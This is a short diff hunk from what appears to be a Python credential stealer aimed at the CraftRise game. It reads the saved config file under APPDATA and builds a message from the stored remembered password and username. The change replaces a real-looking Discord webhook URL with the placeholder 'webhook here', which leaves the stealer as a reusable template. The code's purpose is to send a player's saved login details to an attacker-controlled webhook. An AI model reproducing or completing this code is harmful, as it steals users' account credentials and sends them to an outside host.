@@ -7,7 +7,7 @@ with open(f"{os.getenv('APPDATA')}/.craftrise/config.json") as f:
 
 
 
-url = "https://discord.com/api/webhooks/871350978576805908/FKi5MjzjmsiYnXF_-dmqvS-vx87ODtd1JQLfvKoM9yekHsdAycdjSwm3CSensEcOs_d1"
+url = "webhook here"
 
 
 data2 = {"content":f"{data['rememberPass']}{data['rememberName']}"}
